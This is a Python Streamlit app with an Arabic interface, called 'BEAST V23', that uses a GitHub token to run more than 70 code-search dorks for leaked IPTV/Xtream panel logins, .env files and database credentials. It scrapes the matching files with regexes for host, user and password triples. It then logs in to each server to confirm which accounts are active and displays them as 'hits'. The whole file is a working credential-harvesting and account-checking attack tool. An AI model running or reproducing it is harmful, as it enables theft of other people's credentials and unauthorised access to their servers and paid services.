import streamlit as st
import requests
import re
import time
from datetime import datetime

# إعدادات الواجهة
st.set_page_config(page_title="BEAST V23 LIVE - MASSIVE MODE", layout="wide")

# نظام الدخول
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - LIVE FEED (ULTRA)</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الألوان
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
    .active-hit { 
        background: #0d1117; border: 1px solid #00ff41; 
        padding: 10px; border-radius: 5px; margin-bottom: 5px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #fff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.title("⚡ BEAST V23 - MASSIVE SCAN")
    token = st.text_input("GitHub Token:", type="password")
    max_pages_per_dork = st.slider("عدد الصفحات لكل Dork (زيادة = نتائج أكثر)", 5, 100, 30)
    start = st.button("🚀 ابدأ الهجوم العملاق")
    st.info("النتائج ستظهر فوراً. عدد الصفحات الكبير قد يسبب Rate Limit، لكنه يجلب أقصى نتائج")

st.subheader("📡 الرادار المباشر (الفحص الحالي)")
radar_area = st.empty()

st.subheader("🏆 النتائج الشغالة (Hits)")
hits_area = st.container()

if start and token:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # قائمة دروكس ضخمة (أكثر من 70 dork) تغطي كل ما يتعلق بـ Xtream و IPTV
    dorks = [
        # أساسيات Xtream
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:txt "portal.php?username="',
        'extension:php "username" "password" "server" "port"',
        'extension:json "server" "username" "password"',
        'extension:cfg "xtream" "user" "pass"',
        'extension:conf "enigma2" "http" "user"',
        'extension:txt "http://" "user" "pass" "panel"',
        'extension:xml "streaming" "auth"',
        'extension:log "login" "password" "iptv"',
        'path:.env "XTREAM"',
        'path:config.php "db_user" "db_pass"',
        'extension:sql "INSERT INTO users" "password"',
        'extension:txt "xtreamui" "admin"',
        'extension:txt "cpanel" "host" "user" "pass"',
        'extension:conf "stream" "login"',
        'extension:yaml "iptv" "credentials"',
        'extension:ini "portal" "username"',
        'extension:txt "http://" "8080" "username" "password"',
        'extension:txt "http://" "25461" "username" "password"',
        'extension:txt "panel_api.php?username="',
        '"player_api.php?username=" extension:php',
        # متقدم
        '"xtream" "port" "user" "pass" extension:txt',
        '"stream" "server" "login" extension:conf',
        '"iptv" "username" "password" extension:json',
        '"m3u" "username" "password" extension:txt',
        '"http://" "8080" "iptv" extension:txt',
        '"portal" "username" "password" extension:php',
        '"server" "port" "iptv" extension:txt',
        '"url" "port" "iptv" filetype:json',
        '"live" "stream" "http" filetype:m3u',
        '"xtream" "api" "key" filetype:json',
        '"playlist" "m3u" "iptv" filetype:txt',
        '"stalker" "portal" "mac" filetype:txt',
        '"streaming" "server" "login" filetype:conf',
        '"vod" "server" "port" filetype:txt',
        '"xtream" "panel" "admin" filetype:php',
        '"iptv" "api" "stream" filetype:json',
        '"live" "tv" "stream" "http" filetype:m3u8',
        '"iptv" "auth" "login" filetype:conf',
        '"xtream" "client" "api" filetype:php',
        '"iptv" "reseller" "panel" filetype:txt',
        '"stb" "emulator" "portal" filetype:cfg',
        '"iptv" "subscription" "url" filetype:json',
        '"xtream" "stream" "proxy" filetype:go',
        '"iptv" "m3u" "playlist" "url" filetype:txt',
        '"stream" "proxy" "iptv" filetype:js',
        '"iptv" "portal" "address" filetype:txt',
        '"live" "streaming" "server" filetype:cfg',
        '"iptv" "epg" "xmltv" filetype:xml',
        '"stream" "source" "iptv" filetype:json',
        '"iptv" "panel" "admin" filetype:php',
        # ملفات التكوين الشائعة
        'filename:.env "IPTV"',
        'filename:settings.php "username" "password" "port"',
        'filename:config.ini "xtream"',
        'filename:streams.json "server"',
        'filename:credentials.txt "http"',
        'extension:txt "user" "pass" "server" "port" iptv',
        'extension:json "xtream" "user" "pass"',
        'extension:cfg "server" "port" "user"',
        'extension:conf "localhost" "user" "pass" iptv',
        # إضافات قوية
        '"get_live_streams" "username" "password"',
        '"action=get_live_categories" filetype:php',
        '"user_info" "exp_date" "active_cons"',
        '"streaming" "api" "key" filetype:env',
        '"db_host" "db_user" "iptv" filetype:php',
        '"panel" "username" "password" "port" filetype:txt',
        '"xtream" "billing" "reseller" filetype:php',
        '"server" "port" "login" "password" filetype:conf',
        '"enigma2" "userbouquet" filetype:tv',
        '"stalker" "middleware" "server" filetype:conf',
    ]
    
    total_dorks = len(dorks)
    radar_area.info(f"🚀 بدء البحث باستخدام {total_dorks} Dork و {max_pages_per_dork} صفحة لكل Dork")
    
    found_count = 0
    processed_requests = 0
    
    for idx, dork in enumerate(dorks):
        radar_area.info(f"🔎 Dork {idx+1}/{total_dorks}: {dork[:60]}...")
        
        for page in range(1, max_pages_per_dork + 1):
            try:
                # استخدام per_page=100 لأقصى نتائج
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                res_raw = requests.get(search_url, headers=headers)
                processed_requests += 1
                
                # إدارة Rate Limit - قراءة الـ headers
                if res_raw.status_code == 403 and 'rate limit' in res_raw.text.lower():
                    reset_time = int(res_raw.headers.get('x-ratelimit-reset', time.time() + 60))
                    wait_seconds = max(1, reset_time - time.time() + 5)
                    radar_area.warning(f"⏳ Rate limit! انتظار {int(wait_seconds)} ثانية...")
                    time.sleep(wait_seconds)
                    continue
                
                res = res_raw.json()
                
                if "items" not in res:
                    if page == 1:
                        break  # لا نتائج لهذا الـ dork
                    continue
                
                items = res.get("items", [])
                if not items:
                    break  # انتهت الصفحات
                
                radar_area.info(f"   📄 صفحة {page}: {len(items)} ملف")
                
                for item in items:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=4).text
                        
                        # أنماط متعددة لاستخراج بيانات الاعتماد (زيادة الاحتمالات)
                        patterns = [
                            r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)",
                            r"(https?://[a-zA-Z0-9\.-]+:\d+).*?username[=:][\"']?([^\"'&\\s]+)[\"']?.*?password[=:][\"']?([^\"'&\\s]+)",
                            r"host[=:][\"']?([^\"'\\s]+:\d+)[\"']?.*?user[=:][\"']?([^\"'\\s]+)[\"']?.*?pass[=:][\"']?([^\"'\\s]+)",
                            r"server[=:][\"']?([^\"'\\s]+:\d+)[\"']?.*?username[=:][\"']?([^\"'\\s]+)[\"']?.*?password[=:][\"']?([^\"'\\s]+)"
                        ]
                        
                        matches = []
                        for pattern in patterns:
                            matches.extend(re.findall(pattern, content, re.IGNORECASE))
                        
                        for m in matches:
                            # التأكد من وجود 3 أجزاء: host, user, pw
                            if len(m) >= 3:
                                host, user, pw = m[0], m[1], m[2]
                            else:
                                continue
                            
                            radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host} | {user}</p>", unsafe_allow_html=True)
                            
                            try:
                                check_url = f"{host}/player_api.php?username={user}&password={pw}"
                                r_check = requests.get(check_url, timeout=2)
                                if r_check.status_code == 200:
                                    try:
                                        data = r_check.json()
                                        if data.get("user_info", {}).get("status") == "Active":
                                            found_count += 1
                                            with hits_area:
                                                st.markdown(f"""
                                                <div class="active-hit">
                                                    <span class="text-green">✅ HIT #{found_count}</span><br>
                                                    <span class="text-white">HOST: {host}</span><br>
                                                    <span class="text-yellow">USER: {user} | PASS: {pw}</span>
                                                </div>
                                                """, unsafe_allow_html=True)
                                    except:
                                        pass
                            except:
                                continue
                    except Exception as e:
                        continue
                
                # تأخير بسيط بين الصفحات لتجنب الـ rate limit
                time.sleep(0.3)
                
            except Exception as e:
                continue
    
    st.success(f"✅ اكتمل البحث! تم العثور على {found_count} سيرفر شغّال من إجمالي {processed_requests} طلب API.")
    if found_count == 0:
        st.warning("⚠️ لم يتم العثور على نتائج. قد يكون Token غير صالح أو أن GitHub Rate Limit عالٍ. حاول استخدام Token جديد أو قلل عدد الصفحات.")

else:
    st.info("👈 أدخل GitHub Token ثم اضغط 'ابدأ الهجوم العملاق' لبدء البحث.")
